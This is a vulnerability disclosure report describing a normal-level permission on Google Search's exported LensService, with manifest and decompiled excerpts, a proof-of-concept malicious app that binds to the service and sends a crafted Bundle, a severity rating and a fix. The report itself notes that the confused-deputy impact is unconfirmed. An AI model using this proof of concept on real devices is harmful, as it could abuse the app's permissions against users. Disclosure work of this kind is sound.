# VRP Report #37: AGSA LensService Bound Service with Normal-Protection Permission

## Summary
The `LensService` in Google Search (AGSA) is an exported bound service protected by the `com.google.android.googlequicksearchbox.permission.LENS_SERVICE` permission, which is declared with `protectionLevel="normal"`. This means any installed app that declares `<uses-permission android:name="com.google.android.googlequicksearchbox.permission.LENS_SERVICE"/>` in its manifest will automatically receive the permission without any user prompt, signature check, or install-time review. The service implements `com.google.android.libraries.lens.sdk.shared.ILensService` and telemetry enums suggest sensitive operations including `LENS_SERVICE_START_ACTIVITY` and `LENS_SERVICE_REQUEST_PENDING_INTENT`, which could enable confused-deputy attacks.

## Affected Component
- **App**: Google Search / AGSA (`com.google.android.googlequicksearchbox`)
- **Component**: `com.google.android.apps.search.lens.service.LensService`
- **Type**: Bound Service
- **Exported**: true (AndroidManifest.xml line 1718)
- **Permission**: `com.google.android.googlequicksearchbox.permission.LENS_SERVICE` (line 190)
- **Protection Level**: `normal` (auto-granted, no user prompt)

## Vulnerability Details

### Permission Declaration (AndroidManifest.xml line 190)
```xml
<permission
    android:name="com.google.android.googlequicksearchbox.permission.LENS_SERVICE"
    android:protectionLevel="normal"/>
```

`protectionLevel="normal"` means the permission is automatically granted to any app that requests it at install time. No user interaction required.

### Service Declaration (AndroidManifest.xml line 1718)
```xml
<service
    android:exported="true"
    android:name="com.google.android.apps.search.lens.service.LensService"
    android:permission="com.google.android.googlequicksearchbox.permission.LENS_SERVICE"
    android:process=":googleapp"/>
```

### AIDL Interface (dliq.java)
```java
public final class dliq extends usv implements IInterface {
    public dliq() {
        super("com.google.android.libraries.lens.sdk.shared.ILensService");
    }
    
    protected final boolean dispatchTransaction(int i, Parcel parcel, Parcel parcel2, int i2) {
        // Transaction 1: Reads Bundle
        // Transaction 2: Reads ILensServiceCallback binder
        // Transaction 3: Empty
    }
}
```

### Telemetry Enum (xej.java) — Sensitive Operations
```java
LENS_SERVICE_IMAGE_INJECT = 341;       // Inject images into Lens
LENS_SERVICE_START_ACTIVITY = 355;     // Confused deputy: start Activity
LENS_SERVICE_REQUEST_PENDING_INTENT = 412;  // Obtain PendingIntent from AGSA
LENS_SERVICE_TARGET_API_VERSION = 348;
LENS_SERVICE_SDK_CLIENT_EVENT = 438;
```

`LENS_SERVICE_START_ACTIVITY` and `LENS_SERVICE_REQUEST_PENDING_INTENT` are particularly concerning — they suggest the service can be used to ask AGSA (which holds extensive permissions including location, contacts, microphone, camera) to start activities or create PendingIntents on the caller's behalf.

## Proof of Concept

### Malicious app (auto-granted permission):
```xml
<!-- AndroidManifest.xml of malicious app -->
<uses-permission android:name="com.google.android.googlequicksearchbox.permission.LENS_SERVICE"/>
```

```java
public class LensExploitActivity extends Activity {
    private IInterface lensService;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        Intent bindIntent = new Intent("com.google.android.lens.BIND");
        bindIntent.setPackage("com.google.android.googlequicksearchbox");
        
        bindService(bindIntent, new ServiceConnection() {
            @Override
            public void onServiceConnected(ComponentName name, IBinder service) {
                // Bound to LensService — can now send transactions
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                
                // Transaction 1: Send a Bundle (potentially with start_activity params)
                Bundle payload = new Bundle();
                payload.putParcelable("intent", new Intent(Intent.ACTION_VIEW, 
                    Uri.parse("content://contacts/people")));
                data.writeInterfaceToken(
                    "com.google.android.libraries.lens.sdk.shared.ILensService");
                data.writeBundle(payload);
                service.transact(1, data, reply, 0);
            }
            
            @Override
            public void onServiceDisconnected(ComponentName name) {}
        }, BIND_AUTO_CREATE);
    }
}
```

## Impact

### Permission Misconfiguration (HIGH)
- The `LENS_SERVICE` permission should be `signature` or `signatureOrSystem` protection level
- Currently, any third-party app can bind to this service without user awareness
- AGSA holds extensive permissions (camera, microphone, location, contacts, storage)

### Potential Confused Deputy (needs dynamic verification)
- If `LENS_SERVICE_START_ACTIVITY` transaction is functional, an attacker could use AGSA's permissions and identity to start privileged activities
- If `LENS_SERVICE_REQUEST_PENDING_INTENT` is functional, an attacker could obtain a PendingIntent running with AGSA's identity (including its permissions)
- Image injection via `LENS_SERVICE_IMAGE_INJECT` could allow camera feed spoofing for Lens OCR/translation

### Note
The binder implementation in the decompiled code appears stripped (3 stub transactions). Full transaction handling may be loaded dynamically via split APK modules. Dynamic testing is required to confirm whether the sensitive operations (START_ACTIVITY, REQUEST_PENDING_INTENT) are functional.

## Severity Assessment
- **Confidentiality**: MEDIUM-HIGH (potential access to AGSA's permissions via confused deputy)
- **Integrity**: MEDIUM (potential to start activities/obtain PendingIntents as AGSA)
- **User Interaction**: NONE (auto-granted permission, zero-click binding)
- **Permissions Required**: NONE effectively (normal permission = auto-granted)
- **Attack Complexity**: LOW (standard AIDL binding)

## Fix Recommendation
Change the permission protection level to `signature`:
```xml
<permission
    android:name="com.google.android.googlequicksearchbox.permission.LENS_SERVICE"
    android:protectionLevel="signature"/>
```

This ensures only Google-signed apps can bind to the service.

## Device / Build
- Pixel 6a, Android 17 (API 37), Build CP2A.260605.012
- Google Search (AGSA) as bundled
